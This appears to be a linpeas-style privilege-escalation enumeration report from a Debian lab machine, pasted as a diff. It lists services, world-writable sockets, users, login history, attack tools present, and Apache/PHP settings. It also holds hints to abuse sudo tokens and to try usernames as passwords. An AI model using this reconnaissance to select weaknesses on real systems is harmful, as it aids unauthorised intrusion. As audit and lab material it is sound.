+dbus.service                       loaded active running D-Bus System Message Bus
+getty@tty1.service                 loaded active running Getty on tty1
+ifup@enp0s3.service                loaded active exited  ifup for enp0s3
+  Potential issue in service file: /lib/systemd/system/ifup@.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+ifupdown-pre.service               loaded active exited  Helper to synchronize boot up for ifupdown
+  Potential issue in service file: /lib/systemd/system/ifupdown-pre.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+keyboard-setup.service             loaded active exited  Set the console keyboard layout
+kmod-static-nodes.service          loaded active exited  Create list of static device nodes for the current kernel
+mysql.service                      loaded active running MySQL Community Server
+networking.service                 loaded active exited  Raise network interfaces
+rsyslog.service                    loaded active running System Logging Service
+ssh.service                        loaded active running OpenBSD Secure Shell server
+systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
+  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+systemd-journald.service           loaded active running Journal Service
+systemd-logind.service             loaded active running User Login Management
+systemd-modules-load.service       loaded active exited  Load Kernel Modules
+systemd-random-seed.service        loaded active exited  Load/Save Random Seed
+systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
+  Potential issue in service: systemd-remount-fs.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands
+systemd-sysctl.service             loaded active exited  Apply Kernel Variables
+systemd-sysusers.service           loaded active exited  Create System Users
+  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service: systemd-sysusers.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands
+systemd-timesyncd.service          loaded active running Network Time Synchronization
+systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
+systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
+systemd-udev-trigger.service       loaded active exited  Coldplug All udev Devices
+  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service: systemd-udev-trigger.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands
+systemd-udevd.service              loaded active running Rule-based Manager for Device Events and Files
+  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown
+systemd-user-sessions.service      loaded active exited  Permit User Sessions
+user-runtime-dir@1001.service      loaded active exited  User Runtime Directory /run/user/1001
+user-runtime-dir@1002.service      loaded active exited  User Runtime Directory /run/user/1002
+user@1001.service                  loaded active running User Manager for UID 1001
+user@1002.service                  loaded active running User Manager for UID 1002
+wpa_supplicant.service             loaded active running WPA supplicant
+  Potential issue in service: wpa_supplicant.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+SUB    = The low-level unit activation state, values depend on unit type.
+34 loaded units listed.
+
+══╣ Disabled services:
+apache-htcacheclean.service            disabled enabled                                                                                                                                      
+apache-htcacheclean@.service           disabled enabled
+apache2@.service                       disabled enabled
+console-getty.service                  disabled disabled
+debug-shell.service                    disabled disabled
+ifupdown-wait-online.service           disabled enabled
+mysql@.service                         disabled enabled
+nftables.service                       disabled enabled
+serial-getty@.service                  disabled enabled
+systemd-boot-check-no-failures.service disabled disabled
+systemd-network-generator.service      disabled disabled
+systemd-networkd-wait-online.service   disabled disabled
+systemd-networkd.service               disabled enabled
+systemd-resolved.service               disabled enabled
+systemd-time-wait-sync.service         disabled disabled
+wpa_supplicant-nl80211@.service        disabled enabled
+wpa_supplicant-wired@.service          disabled enabled
+wpa_supplicant@.service                disabled enabled
+18 unit files listed.
+
+══╣ Additional service files:
+You can't write on systemd PATH                                                                                                                                                              
+
+╔══════════╣ Systemd Information
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                              
+═╣ Systemd version and vulnerabilities? .............. 247.3                                                                                                                                 
+═╣ Services running as root? ..... 
+═╣ Running services with dangerous capabilities? ... 
+═╣ Services with writable paths? . apache2.service: Uses relative path 'start' (from ExecStart=/usr/sbin/apachectl start)
+mysql.service: Uses relative path 'pre' (from ExecStartPre=/usr/share/mysql-8.0/mysql-systemd-start pre)
+rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)
+
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                              
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                            
+
+╔══════════╣ Analyzing .socket files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                    
+                                                                                                                                                                                             
+╔══════════╣ Unix Sockets Analysis
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                    
+/run/dbus/system_bus_socket                                                                                                                                                                  
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/mysqld/mysqld.sock
+  └─(Read Write Execute (Weak Permissions: 777) )
+/run/mysqld/mysqlx.sock
+  └─(Read Write Execute (Weak Permissions: 777) )
+/run/systemd/fsck.progress
+/run/systemd/inaccessible/sock
+/run/systemd/io.system.ManagedOOM
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/systemd/journal/dev-log
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/systemd/journal/io.systemd.journal
+/run/systemd/journal/socket
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/systemd/journal/stdout
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/systemd/journal/syslog
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/systemd/notify
+  └─(Read Write Execute (Weak Permissions: 777) )
+  └─(Owned by root)
+/run/systemd/private
+  └─(Read Write Execute (Weak Permissions: 777) )
+  └─(Owned by root)
+/run/systemd/userdb/io.systemd.DynamicUser
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+/run/udev/control
+/run/user/1001/gnupg/S.dirmngr
+  └─(Read Write )
+/run/user/1001/gnupg/S.gpg-agent
+  └─(Read Write )
+/run/user/1001/gnupg/S.gpg-agent.browser
+  └─(Read Write )
+/run/user/1001/gnupg/S.gpg-agent.extra
+  └─(Read Write )
+/run/user/1001/gnupg/S.gpg-agent.ssh
+  └─(Read Write )
+/run/user/1001/systemd/inaccessible/sock
+/run/user/1001/systemd/notify
+  └─(Read Write Execute )
+/run/user/1001/systemd/private
+  └─(Read Write Execute )
+/var/run/mysqld/mysqld.sock
+  └─(Read Write Execute (Weak Permissions: 777) )
+/var/run/mysqld/mysqlx.sock
+  └─(Read Write Execute (Weak Permissions: 777) )
+
+╔══════════╣ D-Bus Analysis
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                      
+NAME                        PID PROCESS         USER             CONNECTION    UNIT                      SESSION DESCRIPTION                                                                 
+:1.0                        250 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -
+:1.1                          1 systemd         root             :1.1          init.scope                -       -
+:1.2                        362 wpa_supplicant  root             :1.2          wpa_supplicant.service    -       -
+:1.3                        354 systemd-logind  root             :1.3          systemd-logind.service    -       -
+:1.396                    13942 busctl          dexter           :1.396        session-4.scope           4       -
+:1.6                        641 systemd         travis           :1.6          user@1002.service         -       -
+:1.9                        681 systemd         dexter           :1.9          user@1001.service         -       -
+fi.w1.wpa_supplicant1       362 wpa_supplicant  root             :1.2          wpa_supplicant.service    -       -
+org.bluez                     - -               -                (activatable) -                         -       -
+org.freedesktop.DBus          1 systemd         root             -             init.scope                -       -
+org.freedesktop.hostname1     - -               -                (activatable) -                         -       -
+org.freedesktop.locale1       - -               -                (activatable) -                         -       -
+org.freedesktop.login1      354 systemd-logind  root             :1.3          systemd-logind.service    -       -
+org.freedesktop.network1      - -               -                (activatable) -                         -       -
+org.freedesktop.resolve1      - -               -                (activatable) -                         -       -
+org.freedesktop.systemd1      1 systemd         root             :1.1          init.scope                -       -
+org.freedesktop.timedate1     - -               -                (activatable) -                         -       -
+org.freedesktop.timesync1   250 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -
+
+╔══════════╣ D-Bus Configuration Files
+Analyzing /etc/dbus-1/system.d/bluetooth.conf:                                                                                                                                               
+  └─(Weak group policy found)
+     └─   <policy group="bluetooth">
+  └─(Allow rules in default context)
+             └─     <allow send_destination="org.bluez"/>
+Analyzing /etc/dbus-1/system.d/wpa_supplicant.conf:
+  └─(Weak group policy found)
+     └─         <policy group="netdev">
+
+══╣ D-Bus Session Bus Analysis
+(Access to session bus available)                                                                                                                                                            
+
+
+
+
+                              ╔═════════════════════╗
+══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                          
+                              ╚═════════════════════╝                                                                                                                                        
+╔══════════╣ Interfaces
+default         0.0.0.0                                                                                                                                                                      
+loopback        127.0.0.0
+link-local      169.254.0.0
+
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.8  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:feff:99b8  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:ff:99:b8  txqueuelen 1000  (Ethernet)
+        RX packets 67977  bytes 6030085 (5.7 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 67136  bytes 4217429 (4.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 12  bytes 752 (752.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12  bytes 752 (752.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+╔══════════╣ Hostname, hosts and DNS
+══╣ Hostname Information                                                                                                                                                                     
+System hostname: debian                                                                                                                                                                      
+FQDN: debian.localdomain
+
+══╣ Hosts File Information
+Contents of /etc/hosts:                                                                                                                                                                      
+  127.0.0.1     localhost
+  127.0.1.1     debian.localdomain      debian
+  ::1     localhost ip6-localhost ip6-loopback
+  ff02::1 ip6-allnodes
+  ff02::2 ip6-allrouters
+
+══╣ DNS Configuration
+DNS Servers (resolv.conf):                                                                                                                                                                   
+  192.168.0.1
+-e 
+Systemd-resolved configuration:
+  [Resolve]
+-e 
+DNS Domain Information:
+localdomain
+(none)
+-e 
+DNS Cache Status (systemd-resolve):
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                 
+══╣ Active Ports (netstat)                                                                                                                                                                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                            
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::33060                :::*                    LISTEN      -                   
+tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
+
+╔══════════╣ Network Traffic Analysis Capabilities
+                                                                                                                                                                                             
+══╣ Available Sniffing Tools
+No sniffing tools found                                                                                                                                                                      
+
+══╣ Network Interfaces Sniffing Capabilities
+Interface enp0s3: Not sniffable                                                                                                                                                              
+No sniffable interfaces found
+
+╔══════════╣ Firewall Rules Analysis
+                                                                                                                                                                                             
+══╣ Iptables Rules
+iptables Not Found                                                                                                                                                                           
+                                                                                                                                                                                             
+══╣ Nftables Rules
+No permission to list nftables rules                                                                                                                                                         
+
+══╣ Firewalld Rules
+firewalld Not Found                                                                                                                                                                          
+                                                                                                                                                                                             
+══╣ UFW Rules
+ufw Not Found                                                                                                                                                                                
+                                                                                                                                                                                             
+╔══════════╣ Inetd/Xinetd Services Analysis
+                                                                                                                                                                                             
+══╣ Inetd Services
+inetd Not Found                                                                                                                                                                              
+                                                                                                                                                                                             
+══╣ Xinetd Services
+xinetd Not Found                                                                                                                                                                             
+                                                                                                                                                                                             
+══╣ Running Inetd/Xinetd Services
+Active Services (from netstat):                                                                                                                                                              
+-e 
+Active Services (from ss):
+-e 
+Running Service Processes:
+
+╔══════════╣ Internet Access?
+Port 443 is accessible                                                                                                                                                                       
+Port 80 is accessible
+ICMP is accessible
+DNS accessible
+Port 443 is accessible with curl
+
+╔══════════╣ Is hostname malicious or leaked?
+╚ This will check the public IP and hostname in known malicious lists and leaks to find any relevant information about the host.                                                             
+{                                                                                                                                                                                            
+    "hostname": "debian",
+    "source_ip": "188.27.211.254",
+    "checks": {
+        "IP in VirusTotal": {
+            "malicious": false,
+            "reason": {
+                "malicious": 0,
+                "suspicious": 0,
+                "undetected": 94,
+                "harmless": 0,
+                "timeout": 0
+            },
+            "reputation": 0
+        },
+        "IP in AbuseIPDB": {
+            "malicious": false,
+            "abuseConfidenceScore": 0,
+            "countryCode": "RO",
+            "totalReports": 0,
+            "lastReportedAt": null
+        },
+        "Hostname in Pastes": {
+            "totalResults": "6",
+            "matches": [
+                {
+                    "link": "https://rovema.kpaste.net/archive?page=16",
+                    "snippet": "ID, Title, User, Added, Expires, Domain. 5db83 \u00b7 Force Debian jessie apt-get update, Anonymous, Wed 27th Apr 2022 18:34 (159 wks 6 days ago), Never, rovema."
+                },
+                {
+                    "link": "https://rovema.kpaste.net/archive?page=6",
+                    "snippet": "Package list (Debian) By: Anonymous 1 wk 1 day ago. msnfs41client: Patches for tests and allocating kernel downcall context from stack+misc, 2025-05-13. By\u00a0..."
+                },
+                {
+                    "link": "https://kpaste.net/archive?page=100",
+                    "snippet": "Package list (Debian bullseye 11.8), Anonymous, Mon 30th Oct 2023 04:03 (82 wks 1 day ago), Never, nrubsig \u00b7 2efb3 \u00b7 Package list (Debian), Anonymous, Mon 30th\u00a0..."
+                },
+                {
+                    "link": "https://kpaste.net/archive",
+                    "snippet": "Package list (Debian), Anonymous, Fri 6th Jun 2025 14:04 (2 days 17 hrs ago), Never, rovema \u00b7 c03649033 \u00b7 TLC Emergency Dentist Huntington Beach 24 Hour\u00a0..."
+                },
+                {
+                    "link": "https://kpaste.net/archive?page=200",
+                    "snippet": "Fix XLFD fonts in Debian (hacked), Anonymous, Tue 27th Jul 2021 16:39 (197 wks 5 days ago), Never, rovema \u00b7 7bd5427c \u00b7 Package list, Anonymous, Tue 27th Jul\u00a0..."
+                },
+                {
+                    "link": "https://kpaste.net/archive?page=32",
+                    "snippet": "Package list (Debian), Anonymous, Sat 21st Sep 2024 15:18 (34 wks 5 days ago), Never, rovema \u00b7 f3bf6a71 \u00b7 msnfs41client: Patch for DrMemory support in ms\u00a0..."
+                }
+            ]
+        },
+        "IP in MalwareWorld": {
+            "malicious": false,
+            "type": [],
+            "urls": []
+        }
+    }
+}
+
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                          
+                               ╚═══════════════════╝                                                                                                                                         
+╔══════════╣ My user
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                                                      
+uid=1001(dexter) gid=1001(dexter) groups=1001(dexter)                                                                                                                                        
+
+╔══════════╣ PGP Keys and Related Files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                                                                                   
+GPG:                                                                                                                                                                                         
+GPG is installed, listing keys:
+-e 
+NetPGP:
+netpgpkeys Not Found
+-e                                                                                                                                                                                           
+PGP Related Files:
+Found: /home/dexter//.gnupg
+total 16
+drwx------ 2 dexter dexter 4096 Jun 10 08:24 .
+drwxrwx--- 4 dexter dexter 4096 Jun 10 08:24 ..
+-rw------- 1 dexter dexter   32 Jun 10 08:24 pubring.kbx
+-rw------- 1 dexter dexter 1200 Jun 10 08:24 trustdb.gpg
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                              
+                                                                                                                                                                                             
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                        
+ptrace protection is disabled (0), so sudo tokens could be abused                                                                                                                            
+
+doas.conf Not Found
+                                                                                                                                                                                             
+╔══════════╣ Checking Pkexec and Polkit
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                                  
+                                                                                                                                                                                             
+══╣ Polkit Binary
+                                                                                                                                                                                             
+══╣ Polkit Policies
+Checking /usr/share/polkit-1/rules.d/:                                                                                                                                                       
+// Allow systemd-networkd to set timezone, get product UUID,
+// and transient hostname
+polkit.addRule(function(action, subject) {
+    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
+         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
+         action.id == "org.freedesktop.timedate1.set-timezone") &&
+        subject.user == "systemd-network") {
+        return polkit.Result.YES;
+    }
+});
+
+══╣ Polkit Authentication Agent
+                                                                                                                                                                                             
+╔══════════╣ Superusers and UID 0 Users
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                                                
+                                                                                                                                                                                             
+══╣ Users with UID 0 in /etc/passwd
+root:x:0:0:root:/root:/bin/bash                                                                                                                                                              
+
+══╣ Users with sudo privileges in sudoers
+                                                                                                                                                                                             
+╔══════════╣ Users with console
+dexter:x:1001:1001::/home/dexter/:/bin/bash                                                                                                                                                  
+root:x:0:0:root:/root:/bin/bash
+travis:x:1002:1002::/home/travis/:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                       
+uid=1001(dexter) gid=1001(dexter) groups=1001(dexter)
+uid=1002(travis) gid=1002(travis) groups=1002(travis),33(www-data)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=101(systemd-timesync) gid=101(systemd-timesync) groups=101(systemd-timesync)
+uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=105(avahi-autoipd) gid=114(avahi-autoipd) groups=114(avahi-autoipd)
+uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(mysql) gid=115(mysql) groups=115(mysql)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=9(news) gid=9(news) groups=9(news)
+
+╔══════════╣ Currently Logged in Users
+                                                                                                                                                                                             
+══╣ Basic user information
+ 08:24:09 up 8 min,  2 users,  load average: 1.78, 0.63, 0.22                                                                                                                                
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+travis   pts/0    10.0.2.4         08:18    3:37   0.03s  0.03s -bash
+dexter   pts/1    10.0.2.4         08:19    1:53   0.63s  0.00s w
+
+══╣ Active sessions
+ 08:24:09 up 9 min,  2 users,  load average: 1.78, 0.63, 0.22                                                                                                                                
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+travis   pts/0    10.0.2.4         08:18    3:37   0.03s  0.03s -bash
+dexter   pts/1    10.0.2.4         08:19    1:53   0.63s  0.00s w
+
+══╣ Logged in users (utmp)
+           system boot  2025-06-10 08:15                                                                                                                                                     
+           run-level 5  2025-06-10 08:15
+LOGIN      tty1         2025-06-10 08:15               417 id=tty1
+travis   + pts/0        2025-06-10 08:18 00:03         638 (10.0.2.4)
+dexter   + pts/1        2025-06-10 08:19 00:01         668 (10.0.2.4)
+
+══╣ SSH sessions
+ESTAB      0      0           10.0.2.8:22           10.0.2.4:45722                                                                                                                           
+ESTAB      0      0           10.0.2.8:22           10.0.2.4:48320                              
+
+══╣ Screen sessions
+                                                                                                                                                                                             
+══╣ Tmux sessions
+                                                                                                                                                                                             
+╔══════════╣ Last Logons and Login History
+                                                                                                                                                                                             
+══╣ Last logins
+dexter   pts/1        10.0.2.4         Tue Jun 10 08:19   still logged in                                                                                                                    
+travis   pts/0        10.0.2.4         Tue Jun 10 08:18   still logged in
+reboot   system boot  5.10.0-8-amd64   Tue Jun 10 08:15   still running
+reboot   system boot  5.10.0-8-amd64   Tue Jun 10 03:52   still running
+reboot   system boot  5.10.0-8-amd64   Fri Jun  6 03:56   still running
+travis   pts/0        192.168.1.7      Sat Sep 25 14:55 - 15:17  (00:22)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 14:50 - 15:17  (00:27)
+travis   pts/0        192.168.1.3      Sat Sep 25 14:02 - 14:03  (00:01)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 14:01 - 14:03  (00:01)
+travis   pts/0        192.168.1.3      Sat Sep 25 13:58 - 14:01  (00:03)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 13:56 - 14:01  (00:04)
+travis   pts/0        192.168.1.3      Sat Sep 25 13:55 - 13:56  (00:00)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 13:55 - 13:56  (00:01)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 13:53 - 13:56  (00:03)
+travis   pts/0        192.168.1.3      Sat Sep 25 13:28 - 13:36  (00:08)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 13:27 - 13:36  (00:09)
+travis   pts/0        192.168.1.3      Sat Sep 25 09:40 - 09:46  (00:05)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 09:40 - 09:46  (00:05)
+travis   pts/0        192.168.1.3      Sat Sep 25 09:34 - 09:39  (00:05)
+reboot   system boot  5.10.0-8-amd64   Sat Sep 25 09:33 - 09:39  (00:06)
+
+wtmp begins Sat Sep 25 06:16:09 2021
+
+══╣ Failed login attempts
+                                                                                                                                                                                             
+══╣ Recent logins from auth.log (limit 20)
+                                                                                                                                                                                             
+══╣ Last time logon each user
+Username         Port     From             Latest                                                                                                                                            
+dexter           pts/1    10.0.2.4         Tue Jun 10 08:19:27 -0400 2025
+travis           pts/0    10.0.2.4         Tue Jun 10 08:18:15 -0400 2025
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
+                                                                                                                                                                                             
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+                                                                                                                                                                                             
+
+
+                             ╔══════════════════════╗
+═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                           
+                             ╚══════════════════════╝                                                                                                                                        
+╔══════════╣ Useful software
+/usr/bin/base64                                                                                                                                                                              
+/usr/bin/curl
+/usr/bin/g++
+/usr/bin/gcc
+/usr/bin/go
+/usr/bin/make
+/usr/bin/nc
+/usr/bin/nc.traditional
+/usr/bin/netcat
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/ping
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python2.7
+/usr/bin/python3
+/usr/bin/ruby
+/usr/bin/sudo
+/usr/bin/wget
+
+╔══════════╣ Installed Compilers
+ii  g++                            4:10.2.1-1                     amd64        GNU C++ compiler                                                                                              
+ii  g++-10                         10.2.1-6                       amd64        GNU C++ compiler
+ii  gcc                            4:10.2.1-1                     amd64        GNU C compiler
+ii  gcc-10                         10.2.1-6                       amd64        GNU C compiler
+ii  golang:amd64                   2:1.15~1                       amd64        Go programming language compiler - metapackage
+ii  golang-1.15                    1.15.9-6                       all          Go programming language compiler - metapackage
+/usr/bin/gcc
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+Apache version: Server version: Apache/2.4.48 (Debian)                                                                                                                                       
+Server built:   2021-08-12T11:51:47
+httpd Not Found
+                                                                                                                                                                                             
+Nginx version: nginx Not Found
+                                                                                                                                                                                             
+/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
+══╣ PHP exec extensions
+drwxr-xr-x 2 root root 4096 Sep 25  2021 /etc/apache2/sites-enabled                                                                                                                          
+drwxr-xr-x 2 root root 4096 Sep 25  2021 /etc/apache2/sites-enabled
+lrwxrwxrwx 1 root root 35 Sep 25  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+
+-rw-r--r-- 1 root root 1332 Aug  8  2020 /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Sep 25  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 73002 Jul  1  2021 /etc/php/7.4/apache2/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+-rw-r--r-- 1 root root 72600 Jul  1  2021 /etc/php/7.4/cli/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+
+
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 2 root root 4096 Sep 25  2021 /etc/pam.d                                                                                                                                          
+-rw-r--r-- 1 root root 2133 Mar 13  2021 /etc/pam.d/sshd
+account    required     pam_nologin.so
+session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
+session    required     pam_loginuid.so
+session    optional     pam_keyinit.so force revoke
+session    optional     pam_motd.so  motd=/run/motd.dynamic
+session    optional     pam_motd.so noupdate
+session    optional     pam_mail.so standard noenv # [1]
+session    required     pam_limits.so
+session    required     pam_env.so # [1]
+session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
+session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
+
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'                                                                                                                                         
+drwxr-xr-x 2 root root 4096 Sep 25  2021 /etc/ldap
+
+
+╔══════════╣ Analyzing Keyring Files (limit 70)
+drwxr-xr-x 2 root root 4096 Sep 25  2021 /usr/share/keyrings                                                                                                                                 
+
+
+
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+-rw-r--r-- 1 root root 761 Aug 12  2020 /usr/share/bash-completion/completions/postfix                                                                                                       
+
+
+╔══════════╣ Analyzing Http conf Files (limit 70)
+lrwxrwxrwx 1 root root 15 Aug 12  2021 /usr/share/doc/apache2/examples/apache2/original/httpd.conf -> ../apache2.conf                                                                        
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+                                                                                                                                                                                             
+
+
+-rw-r--r-- 1 root root 69 Jul  1  2021 /etc/php/7.4/mods-available/ftp.ini
+-rw-r--r-- 1 root root 69 Jul  1  2021 /usr/share/php7.4-common/common/ftp.ini
+
+
+
+
+
+
+╔══════════╣ Analyzing DNS Files (limit 70)
+-rw-r--r-- 1 root root 826 Aug 12  2020 /usr/share/bash-completion/completions/bind                                                                                                          
+-rw-r--r-- 1 root root 826 Aug 12  2020 /usr/share/bash-completion/completions/bind
+
+
+
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3526 Aug  4  2021 /etc/skel/.bashrc                                                                                                                                   
+-rwxrwx--- 1 dexter dexter 3526 Aug  4  2021 /home/dexter/.bashrc
+
+
+
+
+
+-rw-r--r-- 1 root root 807 Aug  4  2021 /etc/skel/.profile
